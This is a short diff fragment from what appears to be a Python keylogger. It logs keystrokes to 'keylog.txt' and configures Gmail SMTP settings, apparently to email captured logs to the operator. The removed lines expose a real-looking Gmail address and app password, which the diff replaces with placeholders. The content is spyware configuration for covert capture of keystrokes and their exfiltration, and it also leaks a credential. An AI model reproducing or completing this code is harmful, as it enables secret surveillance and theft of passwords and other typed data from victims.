@@ -21,9 +21,9 @@ if hwnd:
 logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")
 
 
-EMAIL_ADDRESS = "tubg2980@gmail.com"  
-EMAIL_PASSWORD = "figx aije plaj pbfw"  
-RECIPIENT_EMAIL = "tubg2980@gmail.com"  
+EMAIL_ADDRESS = "your gmail"  
+EMAIL_PASSWORD = "your key(stm)"  
+RECIPIENT_EMAIL = "your gmail"  
 SMTP_SERVER = "smtp.gmail.com"
 SMTP_PORT = 587
 
